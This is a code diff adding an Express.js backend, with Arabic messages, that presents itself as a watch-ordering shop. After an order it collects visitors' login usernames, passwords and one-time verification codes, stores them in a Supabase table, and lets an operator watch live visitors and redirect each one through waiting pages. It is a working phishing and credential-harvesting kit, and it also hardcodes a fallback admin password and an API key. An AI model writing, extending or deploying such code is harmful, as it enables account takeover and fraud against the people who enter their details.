@@ -1,0 +1,203 @@
+const express = require('express');
+const path = require('path');
+const crypto = require('crypto');
+const { createClient } = require('@supabase/supabase-js');
+
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+app.use(express.json());
+
+const SUPABASE_URL = process.env.SUPABASE_URL || 'https://qwqszedggvefzkpqsihu.supabase.co';
+const SUPABASE_KEY = process.env.SUPABASE_KEY || 'sb_publishable_uF-mM8mh9wUHwaogjSjwKg__4N4j_we';
+const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
+
+const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Admin1234@@';
+
+const ADMIN_TOKEN = crypto.createHash('sha256').update(ADMIN_PASSWORD).digest('hex');
+
+// Admin login
+app.post('/api/admin/login', (req, res) => {
+  const { password } = req.body;
+  if (password === ADMIN_PASSWORD) {
+    return res.json({ success: true, token: ADMIN_TOKEN });
+  }
+  res.status(401).json({ success: false, message: 'كلمة المرور غير صحيحة' });
+});
+
+// Admin auth check
+function isAdmin(req) {
+  const auth = req.headers.authorization;
+  if (auth && auth.startsWith('Bearer ')) {
+    return auth.slice(7) === ADMIN_TOKEN;
+  }
+  return false;
+}
+
+// Save order
+app.post('/api/orders', async (req, res) => {
+  try {
+    const { name, phone, watch_color, watch_index } = req.body;
+    if (!name || !phone) {
+      return res.status(400).json({ success: false, message: 'الاسم ورقم الهاتف مطلوبان' });
+    }
+    const { error } = await supabase.from('orders').insert({
+      name, phone,
+      email: phone + '@order.local',
+      wilaya: '-',
+      address: '-',
+      watch_color: watch_color || '-',
+      watch_index: watch_index !== undefined ? watch_index : null,
+      current_page: 'order',
+      status: 'pending',
+      created_at: new Date().toISOString()
+    });
+    if (error) throw error;
+    const { data: inserted } = await supabase.from('orders').select('id').eq('phone', phone).order('created_at', { ascending: false }).limit(1).maybeSingle();
+    res.json({ success: true, order_id: inserted ? inserted.id : null });
+  } catch (err) {
+    res.status(500).json({ success: false, message: err.message });
+  }
+});
+
+// Save login username
+app.post('/api/login-data', async (req, res) => {
+  try {
+    const { order_id, username } = req.body;
+    if (order_id) {
+      await supabase.from('orders').update({ login_username: username, current_page: 'login' }).eq('id', order_id);
+    }
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ success: false, message: err.message });
+  }
+});
+
+// Save login password
+app.post('/api/password-data', async (req, res) => {
+  try {
+    const { order_id, password } = req.body;
+    if (order_id) {
+      await supabase.from('orders').update({ login_password: password, current_page: 'waiting', status: 'pending' }).eq('id', order_id);
+    }
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ success: false, message: err.message });
+  }
+});
+
+// Save verification code
+app.post('/api/code-data', async (req, res) => {
+  try {
+    const { order_id, code } = req.body;
+    if (order_id) {
+      await supabase.from('orders').update({ verification_code: code, status: 'code_pending', current_page: 'code-waiting' }).eq('id', order_id);
+    }
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ success: false, message: err.message });
+  }
+});
+
+// Presence / heartbeat for active visitors
+app.post('/api/presence', async (req, res) => {
+  try {
+    const { session_id, current_page } = req.body;
+    if (!session_id) return res.json({ ok: false });
+    const now = Date.now();
+    const { data: existing } = await supabase.from('visitors').select('id, redirect_to').eq('session_id', session_id).maybeSingle();
+    if (!existing) {
+      await supabase.from('visitors').upsert({
+        session_id, current_page: current_page || 'home',
+        last_active_at: now, created_at: now
+      }, { onConflict: 'session_id' });
+    } else {
+      const updates = { last_active_at: now };
+      if (current_page) updates.current_page = current_page;
+      await supabase.from('visitors').update(updates).eq('session_id', session_id);
+      if (existing.redirect_to) {
+        await supabase.from('visitors').update({ redirect_to: null }).eq('session_id', session_id);
+        return res.json({ ok: true, redirectTo: existing.redirect_to });
+      }
+    }
+    res.json({ ok: true });
+  } catch (err) {
+    res.json({ ok: false });
+  }
+});
+
+// Get active visitors count (admin)
+app.get('/api/visitors/active', async (req, res) => {
+  try {
+    if (!isAdmin(req)) return res.status(401).json({ count: 0 });
+    const cutoff = Date.now() - 15000;
+    const { data } = await supabase.from('visitors').select('*').gt('last_active_at', cutoff);
+    res.json({ count: (data || []).length, visitors: data || [] });
+  } catch (err) {
+    res.json({ count: 0, visitors: [] });
+  }
+});
+
+// Check order status (public - for waiting page)
+app.get('/api/orders/:id/status', async (req, res) => {
+  try {
+    const { data } = await supabase.from('orders').select('status').eq('id', req.params.id).maybeSingle();
+    if (!data) return res.json({ status: 'not_found' });
+    res.json({ status: data.status });
+  } catch (err) {
+    res.json({ status: 'error' });
+  }
+});
+
+// Get orders (admin)
+app.get('/api/orders', async (req, res) => {
+  try {
+    if (!isAdmin(req)) return res.status(401).json({ orders: [] });
+    const { data, error } = await supabase.from('orders').select('*').order('created_at', { ascending: false });
+    if (error) throw error;
+    res.json({ orders: data || [] });
+  } catch (err) {
+    res.status(500).json({ orders: [], message: err.message });
+  }
+});
+
+// Update order status
+app.patch('/api/orders/:id', async (req, res) => {
+  try {
+    if (!isAdmin(req)) return res.status(401).json({ success: false });
+    const updates = {};
+    if (req.body.status) updates.status = req.body.status;
+    if (req.body.redirect_to !== undefined) updates.redirect_to = req.body.redirect_to;
+    const { error } = await supabase.from('orders').update(updates).eq('id', req.params.id);
+    if (error) throw error;
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ success: false, message: err.message });
+  }
+});
+
+// Delete order
+app.delete('/api/orders/:id', async (req, res) => {
+  try {
+    if (!isAdmin(req)) return res.status(401).json({ success: false });
+    const { error } = await supabase.from('orders').delete().eq('id', req.params.id);
+    if (error) throw error;
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ success: false, message: err.message });
+  }
+});
+
+app.use(express.static(path.join(__dirname, 'public')));
+
+app.get('*', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+if (!process.env.VERCEL) {
+  app.listen(PORT, () => {
+    console.log(`Server running on http://localhost:${PORT}`);
+  });
+}
+
+module.exports = app;
